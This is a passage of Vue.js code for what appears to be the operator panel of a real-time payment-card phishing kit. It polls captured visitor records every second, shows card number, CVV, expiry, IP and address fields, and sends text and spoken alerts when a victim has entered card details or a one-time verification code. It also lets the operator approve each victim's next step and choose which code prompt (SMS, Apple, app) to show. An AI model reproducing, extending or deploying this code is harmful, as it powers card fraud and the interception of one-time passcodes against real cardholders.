        return statusMap[status]
      },
      StateTag(status) {
        const statusMap = {
          0: '等待中',
          1: '成功',
          2: '失败'
        }
        return statusMap[status]
      }
    },
    data() {
      return {
        passValue:'code',
        passList:[
          {label:'普通短信',value:'code'},
          {label:'苹果短信',value:'applePay'},
          {label:'APP验证',value:'app'},
          {label:'谷歌短信',value:'google',disabled:true},
          {label:'邮箱验证',value:'email',disabled:true},
        ],
        showCardHolder:false,
        showPost:false,
        showTime:false,
        newSrc: '',
        validSrc: '',
        updateSrc: '',
        cardFinish: '',
        cardValidSrc: '',
        codeValidSrc: 'https://api.vvhan.com/api/song?txt=完成验证码填写，请您处理',
        modal: {
          visible: false,
          id: ''
        },
        statics: {
          online: 0,
          offline: 0,
          total: 0
        },
        p: {
          cardFilter: 0,
          pageNo: 1,
          pageSize: 50,
          dataCount: 0
        },
        dataList: [],
        voice: false,
        cardVoice: false,
        codeVoice: false,
        updateVoice: false,

        cardHolder: '',
        cardNumber: '',
        cardName: '',
        cardNameFirst: '',
        cardDate: '',
        cardCvv: '',
        cardIsTrue: true,
        cardImag1: '',
        cardImag2: '',
        Info: {},
        drawer: false,
        direction: 'ltr',
        showIp: false,
        showAddress: false,
        showEmail: false,
        showName: false,
        listLoading: false,
        token: ''
      }
    },
    computed: {
      item() {
        return item
      }
    },
    created() {
      this.getToken()
    },
    mounted() {
      this.fetchData();
      getSetting().then(resp=>{
        this.passValue=resp.data;
      })
    },
    destroyed() {
      clearInterval(this.timer)
    },
    methods: {
      setItemSetting(data){
        updateSetting({id:data.id,setting:data.passSetting});
      },
      setGlobalSetting(value){
        setSetting({value:value});
      },
      deleteBatch(){
        let selection = this.$refs['dataTable'].selection;
        if (!selection||selection.length===0) {
          this.$message.error('请选择记录');
          return;
        }
        let ids=selection.map(obj=>obj.id);
        this.modal.visible = true
        this.modal.id = ids.join(',')
        this.modal.content = '是否删除' + ids.join('、') + '号数据？'
      },
      getToken() {
        getToken().then(resp => {
          this.token = resp.data
        })
      },
      deleteFn(data) {
        this.modal.visible = true
        this.modal.id = data.id
        this.modal.content = '是否删除' + data.id + '号数据？'
      },
      createVoiceUrl(text) {
        return 'https://tsn.baidu.com/text2audio?tex=' + text + '&tok=' + this.token + '&cuid=1123465&ctp=1&lan=zh'
      },

      sureDeleteFn() {
        deleteData({ id: this.modal.id }).then(resp => {
          this.modal.visible = false
          this.fetchData()
        })
      },
      staticsFn() {
        statics().then(resp => {
          this.statics = resp.data
        })
      },
      checkNew(record) {
        let newData = record.new
        if (newData && this.voice) {
          this.$notify({
            title: '提醒',
            message: record.id + '号新用户浏览',
            type: 'success',
            duration: 10000
          })
          this.$nextTick(()=>{
            this.$refs.new.src=this.createVoiceUrl(record.id + '号新用户浏览');
            this.$refs.new.play()
          })

        }
      },
      checkCardFinish(record) {
        let newData = record.cardUpdate
        if (newData) {
          this.$notify({
            title: '提醒',
            message: record.id + '完成卡号填写',
            type: 'warning',
            duration: 10000
          })
          if (this.cardVoice){
            this.$nextTick(()=>{
              this.$refs.cardFinish.src=this.createVoiceUrl(record.id + '号完成卡号填写');
              this.$refs.cardFinish.play()
            })
          }
        }
      },
      checkCardValid(record) {
        let cardValid = record.cardValid
        if (cardValid) {
          this.$notify({
            title: '提醒',
            message: record.id + '等待您的处理',
            duration: 10000
          })
          if ( this.cardVoice){
            this.$nextTick(()=>{
              this.$refs.cardValid.src=this.createVoiceUrl(record.id + '号等待您的处理');
              this.$refs.cardValid.play()
            })

          }
        }
      },
      checkCodeValid(record) {
        let codeValid = record.codeValid
        if (codeValid) {
          this.$notify({
            title: '提醒',
            message: record.id + '完成验证码填写，请您处理',
            type: 'success',
            duration: 10000
          })
          if ( this.codeVoice){
            this.$nextTick(()=>{
              this.$refs.codeValid.src=this.createVoiceUrl(record.id + '号完成验证码填写，请您处理');
              this.$refs.codeValid.play()
            })
          }
        }
      },
      fetchData() {
        let selection = this.$refs['dataTable'].selection;
        let ids=selection.map(obj=>obj.id);
        this.listLoading = false
        getSyncList(this.p).then(response => {
          let records = response.data;

          for (let i in records) {
            let record = records[i]
            this.checkNew(record)
            this.checkCardFinish(record)
            this.checkCardValid(record)
            this.checkCodeValid(record)
          }
          this.dataList = records;
          this.dataList.forEach((row) => {
            if (ids.indexOf(row.id)>-1){
              this.$nextTick(() => {
                this.$refs['dataTable'].toggleRowSelection(row,
                  true)
              })
            }
          })
          this.p.pageNo = response.pageNo
          this.p.pageSize = response.pageSize
          this.p.dataCount = response.dataCount
          this.listLoading = false
          let timmer = this.timer
          if (timmer) {
            clearTimeout(timmer)
          }
          this.timer = setTimeout(() => {
            this.fetchData()
          }, 1000)
        })
        this.staticsFn()
      },
      handleSizeChange(val) {
        this.p.pageSize = val
        this.fetchData()
      },
      handleCurrentChange(val) {
        this.p.pageNo = val
        this.fetchData()
      },
      UAJiex(ua) {
        if (ua === null) {
          return '其他'
        }
        if (ua.toString().indexOf('iPhone') !== -1) {
          return 'iPhone OS'
        }

        if (ua.toString().indexOf('Android') !== -1) {
          return 'Android'
        }
        if (ua.toString().indexOf('Mac') !== -1) {
          return 'Mac'
        }
        if (ua.toString().indexOf('Windows') !== -1) {
          return 'Windows'
        } else {
          return '其他设备'
        }
      },
      ToDate(time) {
        if (time === null) {
          return ''
        }
        var date = new Date(parseInt(time))
        return `${date.getFullYear()}/${date.getMonth() + 1}/${date.getDate()} ${date.getHours()}:${date.getMinutes()}:${date.getSeconds()}`
      },
      isOnline(time) {
        // eslint-disable-next-line no-unused-vars
        if (Date.now() - time > 5000) {
          return '离线'
        } else {
          return '在线'
        }
      },
      page_await(step, result, row) {
        postSyncAgree({ step: step, result: result, id: row.id })
        this.fetchData()
      },
      cardimage() {
        var a = (this.fullOpen(1, 13)).toString()
        this.cardImag1 = 'assets/' + '0000' + a + '.jpg'
        this.cardImag2 = 'assets/' + a + '0000' + '.jpg'
      },
      fullOpen(n, m) {
        var result = Math.random() * (m - n) + n
        while (result === n) {
          result = Math.random() * (m - n) + n
        }
        return parseInt(result)
      }
    }
  }
</script>
<style>
  .start-voice {
    padding: 3px 10px;
    background: red;
    border-radius: 10px;
    font-size: 15px;
    cursor: pointer;
    color: white;
  }

  .stop-voice {
    color: white;
    padding: 3px 10px;
    background: #2fe9ff;
    border-radius: 10px;
    font-size: 15px;
    cursor: pointer;
  }
</style>
